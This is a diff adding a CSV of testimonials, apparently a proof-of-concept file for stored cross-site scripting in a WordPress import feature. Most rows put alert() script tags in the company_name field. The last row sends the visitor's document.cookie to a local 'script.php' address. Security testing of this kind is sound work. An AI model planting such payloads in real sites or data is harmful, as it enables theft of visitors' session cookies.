@@ -1,0 +1,9 @@
+full_name,email,company_name,company_website,heading,testimonial
+Anna,anna@gmail.com,&lt;script&gt;alert(0)&lt;/script&gt;Alphabet,www.alphabet.com,great service!,Everything I hoped for!
+Barbara,barbara@gmail.com,&lt;script&gt;alert(1)&lt;/script&gt;Alphabet,www.alphabet.com,outstanding service!,I'm in love with you
+Carol,carol@gmail.com,&lt;script&gt;alert(2)&lt;/script&gt;Alphabet,www.alphabet.com,i love it!,Service was great
+Diane,diane@gmail.com,&lt;script&gt;alert(3)&lt;/script&gt;Alphabet,www.alphabet.com,everything good!,Packet was delivered as promised
+Eloise,eloise@gmail.com,&lt;script&gt;alert(4)&lt;/script&gt;Alphabet,www.alphabet.com,great!,I have had a great experience
+Fran,fran@gmail.com,&lt;script&gt;alert(5)&lt;/script&gt;Alphabet,www.alphabet.com,just great!,No hussle!
+Greta,greta@gmail.com,&lt;script&gt;alert(6)&lt;/script&gt;Alphabet,www.alphabet.com,I love this company!,Everything was as promised
+Harriet,harriet@gmail.com,&lt;script language= "JavaScript"&gt;document.location="http://127.0.0.1/wp53/script.php?cookie=" + document.cookie;&lt;/script&gt;,www.alphabet.com,I'm satisfied!,I love your service
